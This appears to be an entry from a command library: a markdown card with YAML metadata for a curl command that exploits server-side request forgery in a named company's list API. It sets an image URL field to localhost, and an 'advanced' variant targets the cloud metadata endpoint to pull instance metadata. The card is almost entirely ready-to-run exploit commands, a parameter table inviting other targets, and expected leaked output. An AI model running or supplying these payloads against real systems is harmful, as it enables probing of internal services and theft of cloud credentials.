---
data: >-
  curl -X POST https://beta.instacart.com/api/v2/lists/[LIST_ID] -H
  "Content-Type: application/x-www-form-urlencoded" -d
  "list[remote_image_url]=http://127.0.0.1:21"
tags:
  - ssrf
  - http
  - api
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.108Z'
id: 6fbea999-dfcb-494a-ae86-9c89efbf010e
verified: false
validated: true
submitted: true
---
# curl-post-to-lists-endpoint

## Command

```bash
curl -X POST https://beta.instacart.com/api/v2/lists/[LIST_ID] -H "Content-Type: application/x-www-form-urlencoded" -d "list[remote_image_url]=http://127.0.0.1:21"
```

## Description

This curl command sends a POST request to Instacart's list update API endpoint, exploiting SSRF by setting the remote_image_url to an internal localhost address. It demonstrates the vulnerability by triggering server-side connections to unauthorized internal resources.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `https://beta.instacart.com/api/v2/lists/[LIST_ID]` | The target endpoint URL, where [LIST_ID] is replaced with a valid list identifier | Yes |
| `-H "Content-Type: application/x-www-form-urlencoded"` | Sets the request body format for form data | Yes |
| `-d "list[remote_image_url]=http://127.0.0.1:21"` | The payload parameter carrying the SSRF URL; modify the URL for different targets | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://beta.instacart.com/api/v2/lists/12345 -H "Content-Type: application/x-www-form-urlencoded" -d "list[remote_image_url]=https://example.com/image.jpg"
```

### Advanced Usage

```bash
curl -X POST https://beta.instacart.com/api/v2/lists/12345 -H "Content-Type: application/x-www-form-urlencoded" -H "Authorization: Bearer [TOKEN]" -d "list[remote_image_url]=http://169.254.169.254/latest/meta-data/"
```

## Expected Output

A JSON error response indicating the server's attempt to fetch the URL, such as {"error": "Failed to fetch image", "details": "Connection to http://127.0.0.1:21: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.3"} if SSRF succeeds, revealing internal service information.

## Related

- [[Related Procedure: Exploit-SSRF-via-Instacart-Remote-Image-URL]]
